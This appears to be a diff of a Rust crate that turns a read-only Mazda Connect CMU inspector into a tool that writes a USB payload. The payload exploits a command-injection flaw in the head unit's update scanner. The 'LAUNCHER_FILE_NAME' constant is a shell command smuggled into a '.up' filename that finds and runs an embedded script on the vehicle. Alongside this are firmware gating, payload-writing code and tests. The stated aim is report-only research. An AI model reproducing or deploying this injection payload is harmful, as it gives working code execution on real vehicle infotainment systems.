@@ -1,255 +1,256 @@
-//! Allowlisted, read-only inspection of a Mazda Connect CMU.
+//! Prepare a firmware-gated, report-only USB payload for a Mazda Connect CMU.
 //!
-//! The collector deliberately has no transport, command execution, privilege escalation,
-//! device access, or filesystem-write capability. It reads a fixed set of Linux metadata
-//! files plus process names and returns a deterministic report.
+//! The Mac-side preparer writes only to an existing, otherwise empty destination directory. The
+//! CMU-side payload is a fixed POSIX shell script embedded in this crate; it has no arbitrary path,
+//! command, persistence, remount, reboot, VIP, CAN, or LIN options.
 
-use std::fs::{self, File};
-use std::io::{self, Read, Write};
-use std::path::Path;
+use std::ffi::OsStr;
+use std::fmt;
+use std::fs::{self, OpenOptions};
+use std::io::{self, Write};
+use std::path::{Path, PathBuf};
 
-const MAX_SOURCE_BYTES: usize = 256 * 1024;
-const SCHEMA_VERSION: u8 = 1;
+#[cfg(target_os = "macos")]
+use std::path::Component;
+#[cfg(target_os = "macos")]
+use std::process::Command;
 
-const FILE_SOURCES: &[&str] = &[
-    "proc/version",
-    "proc/cmdline",
-    "proc/cpuinfo",
-    "proc/meminfo",
-    "proc/mounts",
-    "proc/modules",
-    "proc/bus/input/devices",
-    "etc/os-release",
-    "etc/issue",
-    "sys/class/graphics/fb0/name",
-    "sys/class/graphics/fb0/modes",
-    "sys/class/drm/card0/device/uevent",
-];
+/// The only firmware family on which the USB launcher is currently allowed to run.
+pub const SUPPORTED_FIRMWARE: &str = "74.00.324A";
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum Status {
-    Ok,
-    Truncated,
-    NotFound,
-    PermissionDenied,
-    NotRegularFile,
-    IoError,
-}
-
-impl Status {
-    const fn as_str(self) -> &'static str {
-        match self {
-            Self::Ok => "ok",
-            Self::Truncated => "truncated",
-            Self::NotFound => "not_found",
-            Self::PermissionDenied => "permission_denied",
-            Self::NotRegularFile => "not_regular_file",
-            Self::IoError => "io_error",
-        }
-    }
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct Observation {
-    source: &'static str,
-    status: Status,
-    content: Option<String>,
-}
-
-impl Observation {
-    const fn unavailable(source: &'static str, status: Status) -> Self {
-        Self {
-            source,
-            status,
-            content: None,
-        }
-    }
-}
-
-/// A complete inspection report.
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub struct Report {
-    observations: Vec<Observation>,
-}
-
-impl Report {
-    /// Writes this report as JSON.
-    ///
-    /// # Errors
-    ///
-    /// Returns an error if the destination cannot be written.
-    pub fn write_json(&self, mut destination: impl Write) -> io::Result<()> {
-        write!(
-            destination,
-            "{{\n  \"schema_version\": {SCHEMA_VERSION},\n  \"observations\": ["
-        )?;
-
-        for (index, observation) in self.observations.iter().enumerate() {
-            if index > 0 {
-                write!(destination, ",")?;
-            }
-
-            write!(destination, "\n    {{\"source\":")?;
-            write_json_string(&mut destination, observation.source)?;
-            write!(destination, ",\"status\":")?;
-            write_json_string(&mut destination, observation.status.as_str())?;
-            write!(destination, ",\"content\":")?;
-            if let Some(content) = &observation.content {
-                write_json_string(&mut destination, content)?;
-            } else {
-                write!(destination, "null")?;
-            }
-            write!(destination, "}}")?;
-        }
-
-        write!(destination, "\n  ]\n}}\n")
-    }
-}
-
-/// Reads the fixed CMU inspection allowlist beneath `root`.
+/// The command-injection filename consumed by the vulnerable Gen-6.5 update scanner.
 ///
-/// Passing `/` inspects the running system. An alternate root exists so the exact behavior can
-/// be exercised against fixtures without privileged or vehicle hardware access.
-#[must_use]
-pub fn inspect_root(root: &Path) -> Report {
-    let mut observations = FILE_SOURCES
-        .iter()
-        .map(|source| inspect_file(root, source))
-        .collect::<Vec<_>>();
-    observations.push(inspect_process_names(root));
-    Report { observations }
+/// FAT filenames cannot contain `/`, so the command obtains the root path from the scanner's
+/// established `HOME=/root` environment and checks each stock removable-media mount. The command
+/// can only invoke the fixed `cmu-inspect.sh` filename.
+pub const LAUNCHER_FILE_NAME: &str =
+    "$(R=${HOME%root};for V in a b c d;do P=${R}tmp${R}mnt${R}sd${V}1${R}cmu-inspect.sh;[ -f $P ]&&sh $P&&break;done).up";
+
+const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
+const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
+const COLLECTOR: &[u8] = include_bytes!("../assets/cmu-inspect.sh");
+
+/// An error encountered before or while preparing removable media.
+#[derive(Debug)]
+pub enum PrepareError {
+    UnsupportedFirmware,
+    DestinationNotFound,
+    DestinationIsSymlink,
+    DestinationNotDirectory,
+    DestinationTooBroad,
+    DestinationOutsideMacVolumes,
+    DestinationNotFat32,
+    DestinationNotRemovable,
+    DestinationNotEmpty(String),
+    Io {
+        action: &'static str,
+        path: PathBuf,
+        source: io::Error,
+    },
 }
 
-fn inspect_file(root: &Path, source: &'static str) -> Observation {
-    match read_limited_file(&root.join(source)) {
-        Ok((status, bytes)) => Observation {
-            source,
-            status,
-            content: Some(String::from_utf8_lossy(&bytes).into_owned()),
-        },
-        Err(status) => Observation::unavailable(source, status),
-    }
-}
-
-fn inspect_process_names(root: &Path) -> Observation {
-    const SOURCE: &str = "proc/processes";
-
-    let entries = match fs::read_dir(root.join("proc")) {
-        Ok(entries) => entries,
-        Err(error) => return Observation::unavailable(SOURCE, status_from_error(&error)),
-    };
-
-    let mut processes = Vec::new();
-    for entry in entries {
-        let Ok(entry) = entry else {
-            continue;
-        };
-        let Some(file_name) = entry.file_name().to_str().map(str::to_owned) else {
-            continue;
-        };
-        let Ok(process_id) = file_name.parse::<u32>() else {
-            continue;
-        };
-        let Ok((_, bytes)) = read_limited_file(&entry.path().join("comm")) else {
-            // Processes can exit while /proc is being inspected, so an unreadable entry is not
-            // a failure of the report as a whole.
-            continue;
-        };
-        let name = String::from_utf8_lossy(&bytes)
-            .trim_end_matches(['\r', '\n'])
-            .chars()
-            .map(|character| {
-                if character.is_control() {
-                    ' '
-                } else {
-                    character
-                }
-            })
-            .collect::<String>();
-        processes.push((process_id, name));
-    }
-    processes.sort_unstable_by_key(|(process_id, _)| *process_id);
-
-    let mut content = String::new();
-    for (process_id, name) in processes {
-        use std::fmt::Write as _;
-        let _ = writeln!(content, "{process_id}\t{name}");
-    }
-
-    Observation {
-        source: SOURCE,
-        status: Status::Ok,
-        content: Some(content),
-    }
-}
-
-fn read_limited_file(path: &Path) -> Result<(Status, Vec<u8>), Status> {
-    let metadata = fs::metadata(path).map_err(|error| status_from_error(&error))?;
-    if !metadata.is_file() {
-        return Err(Status::NotRegularFile);
-    }
-
-    let file = File::open(path).map_err(|error| status_from_error(&error))?;
-    let read_limit = u64::try_from(MAX_SOURCE_BYTES + 1).expect("read limit fits in u64");
-    let mut bytes = Vec::new();
-    file.take(read_limit)
-        .read_to_end(&mut bytes)
-        .map_err(|error| status_from_error(&error))?;
-
-    if bytes.len() > MAX_SOURCE_BYTES {
-        bytes.truncate(MAX_SOURCE_BYTES);
-        Ok((Status::Truncated, bytes))
-    } else {
-        Ok((Status::Ok, bytes))
-    }
-}
-
-fn status_from_error(error: &io::Error) -> Status {
-    match error.kind() {
-        io::ErrorKind::NotFound => Status::NotFound,
-        io::ErrorKind::PermissionDenied => Status::PermissionDenied,
-        _ => Status::IoError,
-    }
-}
-
-fn write_json_string(destination: &mut impl Write, value: &str) -> io::Result<()> {
-    write!(destination, "\"")?;
-    for character in value.chars() {
-        match character {
-            '"' => write!(destination, "\\\"")?,
-            '\\' => write!(destination, "\\\\")?,
-            '\u{08}' => write!(destination, "\\b")?,
-            '\u{0c}' => write!(destination, "\\f")?,
-            '\n' => write!(destination, "\\n")?,
-            '\r' => write!(destination, "\\r")?,
-            '\t' => write!(destination, "\\t")?,
-            control if control <= '\u{1f}' => {
-                write!(destination, "\\u{:04x}", u32::from(control))?;
+impl fmt::Display for PrepareError {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        match self {
+            Self::UnsupportedFirmware => write!(
+                formatter,
+                "firmware must be explicitly confirmed as {SUPPORTED_FIRMWARE}"
+            ),
+            Self::DestinationNotFound => write!(formatter, "destination does not exist"),
+            Self::DestinationIsSymlink => {
+                write!(formatter, "destination must not be a symbolic link")
             }
-            printable => write!(destination, "{printable}")?,
+            Self::DestinationNotDirectory => write!(formatter, "destination is not a directory"),
+            Self::DestinationTooBroad => {
+                write!(formatter, "refusing a filesystem root destination")
+            }
+            Self::DestinationOutsideMacVolumes => write!(
+                formatter,
+                "on macOS, destination must be a mounted volume root under /Volumes"
+            ),
+            Self::DestinationNotFat32 => {
+                write!(formatter, "destination volume is not FAT32 (msdos)")
+            }
+            Self::DestinationNotRemovable => {
+                write!(formatter, "destination volume is not removable media")
+            }
+            Self::DestinationNotEmpty(name) => write!(
+                formatter,
+                "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
+            ),
+            Self::Io {
+                action,
+                path,
+                source,
+            } => write!(formatter, "could not {action} {}: {source}", path.display()),
         }
     }
-    write!(destination, "\"")
+}
+
+impl std::error::Error for PrepareError {
+    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
+        match self {
+            Self::Io { source, .. } => Some(source),
+            _ => None,
+        }
+    }
+}
+
+/// Writes the three-file report payload into an existing blank removable-media directory.
+///
+/// `confirmed_firmware` must exactly match [`SUPPORTED_FIRMWARE`]. Existing files are never
+/// overwritten, and a partial preparation is rolled back if a later file cannot be created.
+///
+/// # Errors
+///
+/// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
+/// non-empty, or any payload file cannot be created and flushed.
+pub fn prepare_usb(destination: &Path, confirmed_firmware: &str) -> Result<(), PrepareError> {
+    if confirmed_firmware != SUPPORTED_FIRMWARE {
+        return Err(PrepareError::UnsupportedFirmware);
+    }
+
+    let metadata = fs::symlink_metadata(destination).map_err(|error| {
+        if error.kind() == io::ErrorKind::NotFound {
+            PrepareError::DestinationNotFound
+        } else {
+            io_error("inspect", destination, error)
+        }
+    })?;
+    if metadata.file_type().is_symlink() {
+        return Err(PrepareError::DestinationIsSymlink);
+    }
+    if !metadata.is_dir() {
+        return Err(PrepareError::DestinationNotDirectory);
+    }
+    if destination.parent().is_none() {
+        return Err(PrepareError::DestinationTooBroad);
+    }
+
+    #[cfg(target_os = "macos")]
+    verify_macos_volume(destination)?;
+
+    let entries =
+        fs::read_dir(destination).map_err(|error| io_error("list", destination, error))?;
+    for entry in entries {
+        let entry = entry.map_err(|error| io_error("list", destination, error))?;
+        if !is_ignorable_macos_metadata(&entry.file_name()) {
+            return Err(PrepareError::DestinationNotEmpty(
+                entry.file_name().to_string_lossy().into_owned(),
+            ));
+        }
+    }
+
+    let payloads: [(&str, &[u8]); 3] = [
+        (COLLECTOR_FILE_NAME, COLLECTOR),
+        (UPDATE_FLAG_FILE_NAME, b"\n"),
+        (LAUNCHER_FILE_NAME, b"\n"),
+    ];
+    let mut created = Vec::with_capacity(payloads.len());
+
+    for (name, content) in payloads {
+        let path = destination.join(name);
+        if let Err(error) = create_new_file(&path, content) {
+            let _ = fs::remove_file(&path);
+            rollback_created_files(&created);
+            return Err(io_error("create payload file", &path, error));
+        }
+        created.push(path);
+    }
+
+    Ok(())
+}
+
+fn create_new_file(path: &Path, content: &[u8]) -> io::Result<()> {
+    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
+    file.write_all(content)?;
+    file.sync_all()
+}
+
+fn rollback_created_files(created: &[PathBuf]) {
+    for path in created.iter().rev() {
+        let _ = fs::remove_file(path);
+    }
+}
+
+fn is_ignorable_macos_metadata(name: &OsStr) -> bool {
+    matches!(
+        name.to_str(),
+        Some(".fseventsd" | ".Spotlight-V100" | ".Trashes")
+    )
+}
+
+fn io_error(action: &'static str, path: &Path, source: io::Error) -> PrepareError {
+    PrepareError::Io {
+        action,
+        path: path.to_owned(),
+        source,
+    }
+}
+
+#[cfg(target_os = "macos")]
+fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
+    let mut components = destination.components();
+    let is_volume_root = matches!(components.next(), Some(Component::RootDir))
+        && matches!(components.next(), Some(Component::Normal(name)) if name == "Volumes")
+        && matches!(components.next(), Some(Component::Normal(_)))
+        && components.next().is_none();
+    if !is_volume_root {
+        return Err(PrepareError::DestinationOutsideMacVolumes);
+    }
+
+    let output = Command::new("/usr/sbin/diskutil")
+        .args(["info", "-plist"])
+        .arg(destination)
+        .output()
+        .map_err(|error| io_error("inspect volume with diskutil", destination, error))?;
+    if !output.status.success() {
+        return Err(io_error(
+            "inspect volume with diskutil",
+            destination,
+            io::Error::other("diskutil returned a failure status"),
+        ));
+    }
+
+    let plist = String::from_utf8_lossy(&output.stdout);
+    if !plist_value_starts_with(&plist, "FilesystemType", "<string>msdos</string>") {
+        return Err(PrepareError::DestinationNotFat32);
+    }
+    if !plist_value_starts_with(&plist, "RemovableMedia", "<true/>") {
+        return Err(PrepareError::DestinationNotRemovable);
+    }
+
+    Ok(())
+}
+
+#[cfg(target_os = "macos")]
+fn plist_value_starts_with(plist: &str, key: &str, expected_value: &str) -> bool {
+    let marker = format!("<key>{key}</key>");
+    plist
+        .split_once(&marker)
+        .is_some_and(|(_, remainder)| remainder.trim_start().starts_with(expected_value))
 }
 
 #[cfg(test)]
 mod tests {
-    use std::path::PathBuf;
+    use std::process::Command;
     use std::time::{SystemTime, UNIX_EPOCH};
 
     use super::*;
 
-    struct TestRoot(PathBuf);
+    struct TestDirectory(PathBuf);
 
-    impl TestRoot {
-        fn new() -> Self {
+    impl TestDirectory {
+        fn new(label: &str) -> Self {
             let unique = SystemTime::now()
                 .duration_since(UNIX_EPOCH)
                 .expect("clock is after Unix epoch")
                 .as_nanos();
-            let path = std::env::temp_dir()
-                .join(format!("mazda-cmu-inspect-{}-{unique}", std::process::id()));
-            fs::create_dir_all(&path).expect("create test root");
+            let path = std::env::temp_dir().join(format!(
+                "mazda-cmu-inspect-{label}-{}-{unique}",
+                std::process::id()
+            ));
+            fs::create_dir_all(&path).expect("create test directory");
             Self(path)
         }
 
@@ -261,84 +262,115 @@ mod tests {
         }
     }
 
-    impl Drop for TestRoot {
+    impl Drop for TestDirectory {
         fn drop(&mut self) {
-            fs::remove_dir_all(&self.0).expect("remove test root");
+            fs::remove_dir_all(&self.0).expect("remove test directory");
         }
     }
 
     #[test]
-    fn report_reads_only_allowlisted_sources_and_sorts_processes() {
-        let root = TestRoot::new();
-        root.write("proc/version", b"Linux test\n");
-        root.write("proc/20/comm", b"later\n");
-        root.write("proc/3/comm", b"first\n");
-        root.write("not-allowlisted", b"must not appear");
+    fn prepares_exact_payload_without_overwriting() {
+        let usb = TestDirectory::new("prepare");
 
-        let report = inspect_root(&root.0);
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
 
-        let version = report
-            .observations
-            .iter()
-            .find(|observation| observation.source == "proc/version")
-            .expect("version observation");
-        assert_eq!(version.status, Status::Ok);
-        assert_eq!(version.content.as_deref(), Some("Linux test\n"));
-
-        let processes = report
-            .observations
-            .iter()
-            .find(|observation| observation.source == "proc/processes")
-            .expect("process observation");
-        assert_eq!(processes.content.as_deref(), Some("3\tfirst\n20\tlater\n"));
-        assert!(report
-            .observations
-            .iter()
-            .all(|observation| observation.source != "not-allowlisted"));
+        assert_eq!(
+            fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
+            COLLECTOR
+        );
+        assert_eq!(
+            fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
+            b"\n"
+        );
+        assert!(usb.0.join(LAUNCHER_FILE_NAME).is_file());
+        assert!(matches!(
+            prepare_usb(&usb.0, SUPPORTED_FIRMWARE),
+            Err(PrepareError::DestinationNotEmpty(_))
+        ));
     }
 
     #[test]
-    fn unavailable_and_oversized_sources_are_explicit() {
-        let root = TestRoot::new();
-        root.write("proc/cpuinfo", &vec![b'x'; MAX_SOURCE_BYTES + 1]);
-
-        let report = inspect_root(&root.0);
-        let cpu = report
-            .observations
-            .iter()
-            .find(|observation| observation.source == "proc/cpuinfo")
-            .expect("cpu observation");
-        assert_eq!(cpu.status, Status::Truncated);
-        assert_eq!(
-            cpu.content.as_ref().map(String::len),
-            Some(MAX_SOURCE_BYTES)
-        );
-
-        let memory = report
-            .observations
-            .iter()
-            .find(|observation| observation.source == "proc/meminfo")
-            .expect("memory observation");
-        assert_eq!(memory.status, Status::NotFound);
-        assert_eq!(memory.content, None);
+    fn launcher_name_is_a_single_valid_fat_component() {
+        assert!(LAUNCHER_FILE_NAME.len() <= 255);
+        assert!(!LAUNCHER_FILE_NAME.chars().any(|character| matches!(
+            character,
+            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
+        )));
+        assert!(Path::new(LAUNCHER_FILE_NAME)
+            .extension()
+            .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
+        assert!(LAUNCHER_FILE_NAME.contains("cmu-inspect.sh"));
     }
 
     #[test]
-    fn json_output_escapes_untrusted_source_content() {
-        let report = Report {
-            observations: vec![Observation {
-                source: "fixture",
-                status: Status::Ok,
-                content: Some("quote=\" slash=\\ line=\n nul=\0 snowman=☃".to_owned()),
-            }],
-        };
-        let mut output = Vec::new();
+    fn refuses_unconfirmed_firmware_before_writing() {
+        let usb = TestDirectory::new("firmware");
 
-        report.write_json(&mut output).expect("write report");
+        let result = prepare_usb(&usb.0, "70.00.100A");
 
-        assert_eq!(
-            String::from_utf8(output).expect("valid UTF-8"),
-            "{\n  \"schema_version\": 1,\n  \"observations\": [\n    {\"source\":\"fixture\",\"status\":\"ok\",\"content\":\"quote=\\\" slash=\\\\ line=\\n nul=\\u0000 snowman=☃\"}\n  ]\n}\n"
+        assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
+        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
+    }
+
+    #[test]
+    fn collector_is_firmware_gated_bounded_and_usb_only() {
+        let usb = TestDirectory::new("collector-usb");
+        let root = TestDirectory::new("collector-root");
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
+        root.write(
+            "jci/version.ini",
+            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"A\"\n",
         );
+        root.write("proc/version", b"Linux fixture\n");
+        root.write("proc/cpuinfo", &vec![b'x'; 256 * 1024 + 4096]);
+        root.write("persistent/sentinel", b"unchanged");
+
+        let output = Command::new("sh")
+            .arg(usb.0.join(COLLECTOR_FILE_NAME))
+            .env("MAZDA_CMU_INSPECT_TESTING", "1")
+            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
+            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
+            .output()
+            .expect("run collector");
+
+        assert!(output.status.success());
+        assert!(output.stdout.is_empty());
+        assert!(output.stderr.is_empty());
+        let report = usb.0.join("mazda-cmu-report");
+        assert_eq!(
+            fs::read(report.join("kernel-version.txt")).expect("read captured kernel"),
+            b"Linux fixture\n"
+        );
+        assert_eq!(
+            fs::metadata(report.join("cpuinfo.txt"))
+                .expect("stat captured CPU info")
+                .len(),
+            256 * 1024
+        );
+        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
+        assert!(manifest.contains("proc/cpuinfo\ttruncated\t262144"));
+        assert_eq!(
+            fs::read(root.0.join("persistent/sentinel")).expect("read sentinel"),
+            b"unchanged"
+        );
+    }
+
+    #[test]
+    fn collector_refuses_other_firmware_without_creating_report() {
+        let usb = TestDirectory::new("refusal-usb");
+        let root = TestDirectory::new("refusal-root");
+        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
+        root.write("jci/version.ini", b"JCI_SW_VER=\"cmu150_NA_74.00.331\"\n");
+
+        let output = Command::new("sh")
+            .arg(usb.0.join(COLLECTOR_FILE_NAME))
+            .env("MAZDA_CMU_INSPECT_TESTING", "1")
+            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
+            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
+            .output()
+            .expect("run collector");
+
+        assert!(!output.status.success());
+        assert!(!usb.0.join("mazda-cmu-report").exists());
     }
 }
